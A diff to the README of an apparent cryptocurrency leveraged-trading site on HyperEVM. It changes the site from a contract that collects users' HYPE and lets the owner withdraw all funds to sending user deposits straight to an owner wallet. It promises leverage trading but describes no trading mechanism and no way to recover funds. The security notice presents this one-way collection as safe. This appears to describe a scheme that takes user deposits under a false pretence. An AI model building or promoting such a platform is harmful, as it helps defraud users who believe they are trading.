@@ -15,9 +15,9 @@ A professional token trading platform exclusively for the HyperEVM ecosystem (Ch
 
 🚀 **Website**: [hyperevm-perpetual.vercel.app](https://hyperevm-perpetual.vercel.app)
 
-## Contract Information
+## Wallet Integration
 
-- **Contract Address**: `0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c`
+- **Owner Wallet**: `0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c` (ending in 7048)
 - **Network**: HyperEVM Mainnet (Chain ID: 999)
 - **Explorer**: [View on HyperEVM Scan](https://hyperevmscan.io/address/0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c)
 
@@ -26,7 +26,7 @@ A professional token trading platform exclusively for the HyperEVM ecosystem (Ch
 - **Frontend**: React 18 with vanilla JavaScript
 - **Styling**: Tailwind CSS
 - **Blockchain**: Web3.js with MetaMask integration
-- **Smart Contracts**: Solidity on HyperEVM (`HyperEVMPerpetual.sol`)
+- **Wallet Integration**: Direct transfers to owner wallet
 - **Data Sources**: DexScreener API for authentic token data
 - **Deployment**: Vercel with optimized static configuration
 
@@ -37,13 +37,13 @@ A professional token trading platform exclusively for the HyperEVM ecosystem (Ch
 3. Connect your MetaMask wallet to HyperEVM
 4. Start trading HYPE tokens with leverage
 
-## Contract Details
+## Wallet Details
 
-**Source Code**: `HyperEVMPerpetual.sol`
-**Functions**:
-- `receive()` - Automatically collects HYPE from users
-- `withdrawAllFunds()` - Owner withdraws all accumulated funds
-- `getContractBalance()` - View current contract balance
+**Integration Type**: Direct wallet transfers
+**Functionality**:
+- Direct HYPE transfers to owner wallet
+- Instant fund availability (no withdrawal needed)
+- Standard wallet security and access
 
 ## Network Configuration
 
@@ -56,7 +56,7 @@ Add HyperEVM to MetaMask:
 
 ## Security Notice
 
-⚠️ **Important**: This platform transfers user funds to the deployed smart contract. All HYPE token trades are recorded on-chain with EIP-712 signatures for security.
+⚠️ **Important**: This platform transfers user funds directly to the owner's wallet. All HYPE token trades are recorded with EIP-712 signatures for security.
 
 ## License
 
